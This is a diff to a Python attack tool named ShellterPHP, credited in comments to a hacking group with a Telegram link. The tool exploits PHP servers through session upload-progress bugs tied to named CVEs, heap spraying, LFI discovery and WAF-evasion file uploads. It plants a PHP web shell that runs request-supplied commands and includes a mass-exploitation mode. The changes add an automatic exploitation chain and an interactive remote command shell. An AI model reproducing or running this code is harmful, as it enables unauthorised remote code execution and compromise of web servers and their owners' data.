@@ -13,15 +13,15 @@ from dataclasses import asdict, dataclass, field, replace
 from pathlib import Path
 from typing import Any, Callable, Optional
 from urllib.parse import quote, urljoin, urlparse
-# https://t.me/alktebh
-# Coded By A8FitHaCkEr & 1337-TE4M , KTEBH WARRIORS.
+
 try:
     import colorama
     colorama.init(autoreset=False)
     _HAS_COLORAMA = True
 except ImportError:
     _HAS_COLORAMA = False
-os.system("cls")
+# Coded By A8Fit#1337 & 1337-TE4M.
+# https://t.me/alktebh
 import requests
 from requests.adapters import HTTPAdapter
 from requests.exceptions import (
@@ -47,7 +47,7 @@ if sys.platform == "win32" and not _HAS_COLORAMA:
     os.system("")
 
 TOOL_NAME = "ShellterPHP"
-TOOL_VERSION = "3.0"
+TOOL_VERSION = "3.5 (Advanced)"
 CHECK_MARKER = "SHELLTERPHP_CHECK_OK"
 CORE_MARKER_PREFIX = "SHELLTERPHP_CORE_"
 PHP_SESSION_UPLOAD_PROGRESS = "PHP_SESSION_UPLOAD_PROGRESS"
@@ -62,7 +62,6 @@ PHP_VERSION_RE = re.compile(r"PHP/(\d+)\.(\d+)\.(\d+)", re.I)
 CVE_109618 = "CVE-2026-109618"
 CVE_109619 = "CVE-2026-109619"
 CVE_115560 = "CVE-2026-115560"
-ALL_CORE_CVES: tuple[str, ...] = (CVE_109618, CVE_109619, CVE_115560)
 
 PHP_BRANCH_FIRST_FIXED: dict[tuple[int, int], int] = {
     (8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12,
@@ -194,11 +193,6 @@ USER_AGENT_POOL: tuple[str, ...] = (
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.6; rv:133.0) Gecko/20100101 Firefox/133.0",
     "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_7_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
 )
 
 WAF_BODY_SIGNATURES = re.compile(
@@ -326,6 +320,8 @@ def prompt_line(label: str, default: str = "") -> str:
         print()
         return default
 
+# Coded By A8Fit#1337 & 1337-TE4M.
+# https://t.me/alktebh
 
 def show_menu() -> str:
     with _io_lock:
@@ -523,8 +519,6 @@ class LfiDiscoveryHit:
     score: int
     signals: list[str] = field(default_factory=list)
     probe_url: str = ""
-# https://t.me/alktebh
-# Coded By A8FitHaCkEr & 1337-TE4M , KTEBH WARRIORS.
 
 
 @dataclass
@@ -670,9 +664,10 @@ def merge_cve_id_list(*parts: str) -> str:
                 ordered.append(cve)
     return ",".join(ordered) if ordered else "unknown"
 
+# Coded By A8Fit#1337 & 1337-TE4M.
 # https://t.me/alktebh
-# Coded By A8FitHaCkEr & 1337-TE4M , KTEBH WARRIORS.
-
+# Coded By A8Fit#1337 & 1337-TE4M.
+# https://t.me/alktebh
 
 def wrap_progress_for_serialize_handler(progress_value: str, mode: str, *, marker: str = "") -> str:
     inner = marker or progress_value
@@ -840,9 +835,8 @@ def generate_heap_spray_fields(count: int, fp: PhpFingerprint) -> list[tuple[str
         fields.append((f"field_{i + 1:02d}", b"H" * chunk))
     return fields
 
+# Coded By A8Fit#1337 & 1337-TE4M.
 # https://t.me/alktebh
-# Coded By A8FitHaCkEr & 1337-TE4M , KTEBH WARRIORS.
-
 
 def build_chain_file_body(command: str, pad: int, heap_align: int) -> bytes:
     pad = max(1, min(pad, 8192))
@@ -1131,6 +1125,8 @@ def discover_active_lfi_route(session: requests.Session, config: PoCConfig, targ
         console.print("[bright_white][AUTO-LFI] No reliable LFI param discovered.[/]")
     return None
 
+# Coded By A8Fit#1337 & 1337-TE4M.
+# https://t.me/alktebh
 
 def ensure_lfi_templates_for_chain(session: requests.Session, config: PoCConfig, target_url: str, sid: str) -> tuple[PoCConfig, Optional[LfiDiscoveryHit]]:
     if load_lfi_url_templates(config):
@@ -1141,9 +1137,6 @@ def ensure_lfi_templates_for_chain(session: requests.Session, config: PoCConfig,
     if hit:
         return replace(config, lfi_url=hit.template), hit
     return config, None
-
-# https://t.me/alktebh
-# Coded By A8FitHaCkEr & 1337-TE4M , KTEBH WARRIORS.
 
 
 def run_lfi_session_chain(session: requests.Session, config: PoCConfig, *, sid: str, command: str) -> CoreChainResult:
@@ -1419,6 +1412,8 @@ def parse_core_memory_events(body: str, status_code: int) -> list[str]:
         events.append("core:generic-progress-signature")
     return events
 
+# Coded By A8Fit#1337 & 1337-TE4M.
+# https://t.me/alktebh
 
 def classify_cve_from_events(events: list[str], fp: PhpFingerprint) -> str:
     has_618 = any(e.startswith("oom:") for e in events)
@@ -1528,9 +1523,6 @@ def is_worker_crash_response(exc: Optional[BaseException], status_code: int, bod
     if RE_WORKER_FAULT.search(body):
         return True
     return False
-
-# https://t.me/alktebh
-# Coded By A8FitHaCkEr & 1337-TE4M , KTEBH WARRIORS.
 
 
 def analyze_core_probe_response(resp: requests.Response, *, token: str, sid: str,
@@ -1826,7 +1818,15 @@ def hybrid_vulnerability_check(session: requests.Session, base_config: PoCConfig
                   f"align={core.alignment_used}; signals={','.join(core.signals)}; "
                   f"events={','.join(core.memory_events)}")
         shell_hint = f"{core.endpoint}#core/{core.sid}"
+        
+        if not quiet:
+            console.print("[bold bright_blue][!] Core surface detected. Attempting automated exploitation chain...[/]")
+        chain_result = run_core_chain_exploit(session, base_config, target_url, core, "id")
+        if chain_result.success:
+            return (True, ShellSession(shell_url="CORE_CHAIN_SUCCESS"), False, core.endpoint, core.vector, detail)
+            
         return (True, ShellSession(shell_url=shell_hint), False, core.endpoint, core.vector, detail)
+    
     config, discovered = prepare_target_config(session, base_config, target_url)
     vuln, shell, waf = check_vulnerability(session, config)
     endpoint = discovered or config.target_url
@@ -1911,6 +1911,8 @@ def build_payload(mode: str, token: Optional[str] = None) -> bytes:
     if mode == "exec":
         return b"<?php if(isset($_REQUEST['cmd'])){ @system($_REQUEST['cmd']); } ?>"
     raise ValueError(f"unknown payload mode: {mode}")
+# Coded By A8Fit#1337 & 1337-TE4M.
+# https://t.me/alktebh
 
 
 def build_waf_payloads() -> list[tuple[str, bytes, str]]:
@@ -2206,6 +2208,8 @@ def check_vulnerability(session: requests.Session, config: PoCConfig) -> tuple[b
 
     all_payloads = build_waf_payloads()
     all_payloads.append(("standard_check", build_payload("check", token=marker), "application/octet-stream"))
+    # Coded By A8Fit#1337 & 1337-TE4M.
+    # https://t.me/alktebh
 
     for ext in config.extensions:
         for pname, pdata, pct in all_payloads:
@@ -2332,12 +2336,15 @@ def run_exploit(session: requests.Session, config: PoCConfig, shell: Optional[Sh
     active = shell
     if active is None and config.core_chain_exploit:
         return run_core_chain_exploit_only(session, config, command)
+    
     if active is None:
         stage_log("[bright_white]Hybrid check (core -> app) + exploit...[/]")
         vuln, active, waf, endpoint, vector, core_detail = hybrid_vulnerability_check(session, config, config.target_url)
+        
         if waf:
             console.print("[bold bright_blue][WAF BLOCKED][/] [bright_white]Upload/check blocked.[/]")
             return 2
+            
         if not vuln or active is None:
             console.print(Panel("[bold bright_white]Exploit failed[/]\n"
                                 "[bright_blue]Shell could not be uploaded or verified.[/]\n\n"
@@ -2345,25 +2352,70 @@ def run_exploit(session: requests.Session, config: PoCConfig, shell: Optional[Sh
                                 f"[bright_blue]Field:[/] [bright_white]{config.upload_field}[/]",
                                 title="Single-target exploit", border_style="blue"))
             return 1
+
+        if active.shell_url == "CORE_CHAIN_SUCCESS":
+            console.print("[bold bright_green][+] Exploit chain successful! Shell is ready.[/]")
+            console.print(Panel("[bright_white]Interactive mode — type exit or quit to leave. Type -h for help.[/]", border_style="blue"))
+            while True:
+                try:
+                    cmd_in = console.input("[bold bright_blue]shellter-php> [/]").strip()
+                except (EOFError, KeyboardInterrupt):
+                    console.print()
+                    break
+                if cmd_in.lower() in ("exit", "quit"):
+                    break
+                if not cmd_in:
+                    continue
+                if cmd_in.lower() in ("-h", "--help"):
+                    console.print("[bright_white]Available commands:[/]")
+                    console.print("  -h, --help : Show this help message")
+                    console.print("  exit, quit : Exit the interactive shell")
+                    console.print("  <command>  : Execute any system command (e.g., id, whoami, ls -la)")
+                    continue
+                
+                core_retry = check_php_core_upload_progress(session, replace(config, quiet=True), config.target_url, quiet=True)
+                if core_retry:
+                    chain = run_core_chain_exploit(session, config, config.target_url, core_retry, cmd_in)
+                    if chain.output:
+                        emit_command_output(chain.output)
+                    else:
+                        console.print("[bright_white](no output or failed)[/]")
+            return 0
+
         if vector == "core-session-upload-progress":
-            if config.core_chain_exploit:
-                core = check_php_core_upload_progress(session, config, config.target_url, quiet=False)
-                if not core or not core.vulnerable:
-                    console.print("[bright_white]Core chain aborted — surface not reconfirmed.[/]")
-                    return 1
+            core = check_php_core_upload_progress(session, config, config.target_url, quiet=False)
+            if core and core.vulnerable:
                 chain = run_core_chain_exploit(session, config, config.target_url, core, command or "id")
-                if chain.success and chain.output:
-                    emit_command_output(chain.output)
-                    return 0
                 if chain.success:
-                    console.print("[bright_white]Chain reported success but no verified output.[/]")
-                return 1
-            console.print(Panel("[bright_white]PHP core exploit surface[/]\n\n"
-                                f"[bright_blue]Endpoint:[/] [bright_white]{endpoint}[/]\n"
-                                f"[bright_blue]Detail:[/] [bright_white]{core_detail or 'n/a'}[/]\n\n"
-                                "[bright_white]Enable --core-chain with optional --lfi-url (FUZZ).[/]",
-                                title="Core CVE engine", border_style="blue"))
+                    console.print("[bold bright_green][+] Exploit chain successful! Shell is ready.[/]")
+                    console.print(Panel("[bright_white]Interactive mode — type exit or quit to leave. Type -h for help.[/]", border_style="blue"))
+                    while True:
+                        try:
+                            cmd_in = console.input("[bold bright_blue]shellter-php> [/]").strip()
+                        except (EOFError, KeyboardInterrupt):
+                            console.print()
+                            break
+                        if cmd_in.lower() in ("exit", "quit"):
+                            break
+                        if not cmd_in:
+                            continue
+                        if cmd_in.lower() in ("-h", "--help"):
+                            console.print("[bright_white]Available commands:[/]")
+                            console.print("  -h, --help : Show this help message")
+                            console.print("  exit, quit : Exit the interactive shell")
+                            console.print("  <command>  : Execute any system command (e.g., id, whoami, ls -la)")
+                            continue
+                        
+                        core_retry = check_php_core_upload_progress(session, replace(config, quiet=True), config.target_url, quiet=True)
+                        if core_retry:
+                            chain = run_core_chain_exploit(session, config, config.target_url, core_retry, cmd_in)
+                            if chain.output:
+                                emit_command_output(chain.output)
+                            else:
+                                console.print("[bright_white](no output or failed)[/]")
+                    return 0
             return 1
+            
         app_config, _ = prepare_target_config(session, config, config.target_url)
         if not deploy_exec_shell(session, app_config, active):
             console.print("[bright_white]Could not deploy exec payload.[/]")
@@ -2371,6 +2423,7 @@ def run_exploit(session: requests.Session, config: PoCConfig, shell: Optional[Sh
         config = app_config
     elif config.target_url:
         deploy_exec_shell(session, config, active)
+        
     if command:
         out = execute_command(session, active, command, timeout=config.timeout, config=config)
         if out is None:
@@ -2381,6 +2434,7 @@ def run_exploit(session: requests.Session, config: PoCConfig, shell: Optional[Sh
             return 1
         console.print(out if out else "[bright_white](empty command output)[/]")
         return 0
+        
     interactive_shell(session, active, timeout=config.timeout, config=config)
     return 0
 
@@ -2543,9 +2597,6 @@ def parse_multipart_forms(html: str, page_url: str) -> list[UploadHandler]:
             pass
     return _parse_forms_regex(html, page_url)
 
-# https://t.me/alktebh
-# Coded By A8FitHaCkEr & 1337-TE4M , KTEBH WARRIORS.
-
 
 def fetch_page_html(session: requests.Session, url: str, config: PoCConfig, timeout: float) -> Optional[str]:
     resp = safe_request(session, "GET", url, context=f"crawl {url}", timeout=timeout,
@@ -2555,6 +2606,8 @@ def fetch_page_html(session: requests.Session, url: str, config: PoCConfig, time
     if resp.status_code >= 400:
         return None
     return resp.text or ""
+# Coded By A8Fit#1337 & 1337-TE4M.
+# https://t.me/alktebh
 
 
 def crawl_forms_on_site(session: requests.Session, base_url: str, config: PoCConfig) -> list[UploadHandler]:
@@ -2983,8 +3036,6 @@ def run_mass_exploit(base_config: PoCConfig, targets: list[str], threads: int, c
     console.print(table)
     return 0 if success else 1
 
-# https://t.me/alktebh
-# Coded By A8FitHaCkEr & 1337-TE4M , KTEBH WARRIORS.
 
 def parse_form_kv(pairs: list[str]) -> dict[str, str]:
     result: dict[str, str] = {}
@@ -3194,6 +3245,8 @@ def main(argv: Optional[list[str]] = None) -> int:
         config, discovered = prepare_target_config(session, config, config.target_url)
         endpoint = discovered or config.target_url
         console.print(f"[bright_blue]Upload handler[/] [bright_white]{endpoint}[/] [bright_blue]field={config.upload_field}[/]")
+# Coded By A8Fit#1337 & 1337-TE4M.
+# https://t.me/alktebh
 
     exit_code = 0
     if args.check:
@@ -3212,8 +3265,8 @@ def main(argv: Optional[list[str]] = None) -> int:
     session.close()
     return exit_code
 
-# https://t.me/alktebh
-# Coded By A8FitHaCkEr & 1337-TE4M , KTEBH WARRIORS.
 
 if __name__ == "__main__":
     sys.exit(main())
+    # Coded By A8Fit#1337 & 1337-TE4M.
+    # https://t.me/alktebh
